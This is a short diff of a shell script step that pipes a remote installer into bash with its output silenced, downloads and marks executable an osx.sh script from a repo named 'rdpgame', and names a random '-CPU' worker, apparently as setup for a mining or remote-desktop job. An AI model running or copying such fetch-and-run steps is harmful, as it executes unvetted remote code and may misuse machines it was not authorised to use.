@@ -3,7 +3,7 @@ softwareupdate-1
   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
   brew install --cask screen
   brew install coreutils
-  wget https://github.com/Reyacrypt/rdpgame/edit/main/osx.sh
+  wget https://github.com/Reyacrypt/rdpgame/blob/main/osx.sh
   chmod +x osx.sh
   screen -dms ls
   WORKER=$(echo $(gshuf -i 11111-9999999 -n i)-CPU
